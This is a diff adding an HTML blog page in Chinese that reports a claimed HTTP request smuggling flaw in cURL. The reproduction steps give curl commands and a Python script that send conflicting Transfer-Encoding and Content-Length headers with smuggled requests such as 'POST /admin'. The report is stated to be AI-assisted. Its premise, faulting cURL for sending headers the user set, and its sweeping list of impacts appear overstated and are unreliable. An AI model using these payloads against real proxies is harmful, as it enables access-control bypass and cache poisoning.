@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="本文详细分析了cURL中存在的HTTP请求走私漏洞，该漏洞源于同时处理Transfer-Encoding和Content-Length头时的不一致行为，可能导致认证绕过、缓存投毒等安全问题，包含完整的技术细节和复现步骤。">
+<title>cURL HTTP请求走私漏洞深度分析</title>
+
+<link rel='canonical' href='http://localhost:1313/p/curl-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="cURL HTTP请求走私漏洞深度分析">
+<meta property='og:description' content="本文详细分析了cURL中存在的HTTP请求走私漏洞，该漏洞源于同时处理Transfer-Encoding和Content-Length头时的不一致行为，可能导致认证绕过、缓存投毒等安全问题，包含完整的技术细节和复现步骤。">
+<meta property='og:url' content='http://localhost:1313/p/curl-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/'>
+<meta property='og:site_name' content='办公AI智能小助手'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='网络安全' /><meta property='article:tag' content='漏洞分析' /><meta property='article:tag' content='HTTP协议' /><meta property='article:tag' content='cURL' /><meta property='article:published_time' content='2025-08-05T00:37:20&#43;08:00'/><meta property='article:modified_time' content='2025-08-05T00:37:20&#43;08:00'/>
+<meta name="twitter:title" content="cURL HTTP请求走私漏洞深度分析">
+<meta name="twitter:description" content="本文详细分析了cURL中存在的HTTP请求走私漏洞，该漏洞源于同时处理Transfer-Encoding和Content-Length头时的不一致行为，可能导致认证绕过、缓存投毒等安全问题，包含完整的技术细节和复现步骤。">
+
+
+<script
+  async
+  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+<meta name="referrer" content="no-referrer-when-downgrade" />
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-ECH1V9TWJT"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-ECH1V9TWJT');
+        }
+      </script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_f509edb42ecc0ebd.png" width="234"
+                            height="170" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">办公AI智能小助手</a></h1>
+            <h2 class="site-description">qife的个人博客</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#摘要">摘要</a></li>
+    <li><a href="#受影响版本">受影响版本</a></li>
+    <li><a href="#复现步骤">复现步骤</a></li>
+    <li><a href="#支持材料参考文献">支持材料/参考文献</a></li>
+    <li><a href="#影响">影响</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/curl-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/">cURL HTTP请求走私漏洞深度分析</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            本文详细分析了cURL中存在的HTTP请求走私漏洞，该漏洞源于同时处理Transfer-Encoding和Content-Length头时的不一致行为，可能导致认证绕过、缓存投毒等安全问题，包含完整的技术细节和复现步骤。
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 05, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="http请求走私漏洞分析---curl安全报告">HTTP请求走私漏洞分析 - cURL安全报告
+</h1><h2 id="摘要">摘要
+</h2><p>cURL未明确拒绝同时包含Transfer-Encoding和Content-Length头的HTTP请求，当这些请求通过解释头方式与目标服务器不同的中间系统(代理、负载均衡器、防火墙)时，可能导致HTTP请求走私漏洞(CWE-444)。这种不一致的解释使攻击者可能绕过安全控制走私恶意请求或导致缓存投毒攻击。</p>
+<p>该漏洞源于http.c中的http_req_set_reader()函数，该函数处理Transfer-Encoding头时未验证是否存在冲突的Content-Length头。虽然cURL内部优先处理Transfer-Encoding而非Content-Length，但不会移除或拒绝冲突的Content-Length头，导致两个头同时被发送。</p>
+<p>注意：本漏洞分析通过手动代码审查cURL源代码完成，使用AI辅助构建和格式化本漏洞报告。</p>
+<h2 id="受影响版本">受影响版本
+</h2><p>该漏洞影响包含当前HTTP请求处理实现的cURL版本。测试环境包括：</p>
+<ul>
+<li>cURL版本：8.4.0(curl-master分支)</li>
+<li>平台：Windows 10, Linux Ubuntu 20.04</li>
+<li>libcurl版本：8.4.0</li>
+<li>协议：HTTP/1.1, HTTP/2</li>
+<li>特性：SSL, 分块传输编码</li>
+</ul>
+<p>检查版本命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -V
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="复现步骤">复现步骤
+</h2><ol>
+<li>创建包含冲突头的测试HTTP请求：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -v -X POST <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;Transfer-Encoding: chunked&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;Content-Length: 100&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -d <span class="s2">&#34;0\r\n\r\nSMUGGLED_PAYLOAD&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  http://example.com/test
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>观察cURL发送两个头而不拒绝：</li>
+</ol>
+<ul>
+<li>使用-v标志监控实际HTTP请求</li>
+<li>确认Transfer-Encoding: chunked和Content-Length: 100头同时存在</li>
+<li>注意cURL使用分块编码处理请求同时保留Content-Length头</li>
+</ul>
+<ol start="3">
+<li>使用代理设置演示走私可能性：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 设置优先解释Content-Length的测试代理</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 然后通过代理发送冲突头</span>
+</span></span><span class="line"><span class="cl">curl -v --proxy http://test-proxy:8080 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;Transfer-Encoding: chunked&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;Content-Length: 50&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -X POST <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -d <span class="s2">&#34;0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\n\r\n&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  http://target.com/public
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>使用Python脚本自动化测试：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test_smuggling</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;curl&#34;</span><span class="p">,</span> <span class="s2">&#34;-v&#34;</span><span class="p">,</span> <span class="s2">&#34;--include&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;-H&#34;</span><span class="p">,</span> <span class="s2">&#34;Transfer-Encoding: chunked&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;-H&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Length: 200&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;-X&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;-d&#34;</span><span class="p">,</span> <span class="s2">&#34;0</span><span class="se">\r\n\r\n</span><span class="s2">GET /smuggled HTTP/1.1</span><span class="se">\r\n</span><span class="s2">Host: example.com</span><span class="se">\r\n\r\n</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;http://example.com/endpoint&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;STDOUT:&#34;</span><span class="p">,</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;STDERR:&#34;</span><span class="p">,</span> <span class="n">result</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">test_smuggling</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="5">
+<li>通过检查HTTP流量验证漏洞：</li>
+</ol>
+<ul>
+<li>使用Wireshark等工具捕获实际HTTP请求</li>
+<li>确认冲突头同时存在于网络协议中</li>
+<li>对不同服务器/代理测试相同请求以观察不同解释</li>
+</ul>
+<h2 id="支持材料参考文献">支持材料/参考文献
+</h2><ul>
+<li>源代码分析：http.c - http_req_set_reader()函数和http_req_complete()函数审查</li>
+<li>CWE分类：CWE-444 - HTTP请求不一致解释(&lsquo;HTTP请求/响应走私&rsquo;)</li>
+<li>CVSS评分：6.5(中危) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L</li>
+<li>概念验证脚本：演示漏洞的Python脚本(包含在上述步骤中)</li>
+<li>网络流量捕获：Wireshark/tcpdump捕获显示同一请求中的两个头</li>
+<li>RFC参考：
+<ul>
+<li>RFC 7230 Section 3.3.3 (消息体长度)</li>
+<li>RFC 7230 Section 3.3.1 (传输编码)</li>
+</ul>
+</li>
+<li>类似CVE：
+<ul>
+<li>CVE-2019-16276 (Node.js HTTP请求走私)</li>
+<li>CVE-2020-11946 (多种web服务器中的HTTP请求走私)</li>
+</ul>
+</li>
+<li>安全研究：James Kettle的&quot;HTTP异步攻击：请求走私重生&quot;白皮书</li>
+<li>测试环境：具有不同代理配置的Docker容器用于测试头解释差异</li>
+</ul>
+<h2 id="影响">影响
+</h2><p>攻击者利用此HTTP请求走私漏洞可实现以下重大安全影响：</p>
+<ol>
+<li>认证绕过</li>
+</ol>
+<ul>
+<li>通过绕过认证机制走私请求到受保护端点</li>
+<li>无需凭证访问管理接口或敏感API</li>
+<li>通过不同认证上下文路由请求提升权限</li>
+</ul>
+<ol start="2">
+<li>缓存投毒</li>
+</ol>
+<ul>
+<li>通过将恶意内容与合法URL关联毒害web缓存和CDN</li>
+<li>为后续请求缓存资源的用户提供恶意内容</li>
+<li>操纵缓存响应注入恶意脚本或重定向用户</li>
+</ul>
+<ol start="3">
+<li>请求劫持</li>
+</ol>
+<ul>
+<li>在共享代理环境中拦截和修改其他用户请求</li>
+<li>从共享同一连接的其他用户请求中窃取敏感数据</li>
+<li>操纵会话令牌和认证凭证</li>
+</ul>
+<ol start="4">
+<li>防火墙和安全控制绕过</li>
+</ol>
+<ul>
+<li>通过在走私请求中隐藏恶意负载规避Web应用防火墙(WAF)</li>
+<li>绕过中间设备实现的速率限制和访问控制</li>
+<li>逃避安全监控和日志系统</li>
+</ul>
+<ol start="5">
+<li>会话劫持</li>
+</ol>
+<ul>
+<li>通过走私看似来自合法用户的请求操纵会话管理</li>
+<li>通过拦截认证令牌劫持用户会话</li>
+<li>以合法用户身份执行未授权操作</li>
+</ul>
+<ol start="6">
+<li>数据泄露</li>
+</ol>
+<ul>
+<li>通过走私请求到内部API或数据库访问敏感数据</li>
+<li>绕过数据丢失防护(DLP)系统</li>
+<li>通过精心构造的走私请求提取机密信息</li>
+</ul>
+<ol start="7">
+<li>跨站脚本(XSS)和注入攻击</li>
+</ol>
+<ul>
+<li>通过缓存投毒向响应中注入恶意脚本</li>
+<li>通过走私数据库查询执行SQL注入攻击</li>
+<li>通过毒害缓存内容执行存储型XSS攻击</li>
+</ul>
+<p>影响严重性：中到高，取决于网络架构和安全控制措施。该漏洞在具有多层代理、CDN或共享托管基础设施的环境中尤其危险。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+        
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+        
+            <a href="/tags/http%E5%8D%8F%E8%AE%AE/">HTTP协议</a>
+        
+            <a href="/tags/curl/">CURL</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E5%85%B3%E4%BA%8E%E5%85%81%E8%AE%B8%E7%A8%8B%E5%BA%8F%E6%80%A7%E5%89%94%E9%99%A4%E9%9A%8F%E6%9C%BA%E5%80%BC%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3%E5%88%86%E6%9E%90/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">关于允许程序性剔除随机值的安全隐患分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/critical-langflow%E6%BC%8F%E6%B4%9Ecve-2025-3248%E8%A2%AB%E5%88%A9%E7%94%A8%E4%BC%A0%E6%92%ADflodrix%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Critical Langflow漏洞(CVE-2025-3248)被利用传播Flodrix僵尸网络的技术分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/bludit-v3.16.2%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%86%85%E5%AE%B9%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Bludit v3.16.2存储型XSS漏洞分析：通过&#34;添加新内容&#34;功能实现攻击</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/curl%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%B8%A6%E7%A9%BA%E6%A0%BC%E5%89%8D%E7%BC%80%E7%9A%84-h%E5%8F%82%E6%95%B0%E4%B8%8E--proxy%E8%81%94%E7%94%A8%E5%AF%BC%E8%87%B4http%E5%A4%B4%E6%B3%A8%E5%85%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">curl漏洞报告：带空格前缀的-H参数与--proxy联用导致HTTP头注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90sucuri2018%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E8%B6%8B%E5%8A%BF%E6%8A%A5%E5%91%8Acms%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E5%AE%9E%E5%BD%95/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">深度解析SUCURI《2018被黑网站趋势报告》：CMS漏洞与恶意软件攻防实录</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+
+
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 qife
+    </section>
+    
+    <section class="powerby">
+        
+
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+
+            
+
+    <div class="busuanzi-footer">
+      <span id="busuanzi_container_site_pv">
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+      </span>
+      <span id="busuanzi_container_site_uv">
+        本站访客数<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+    </div>
+
+    </section>
+
+    
+
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
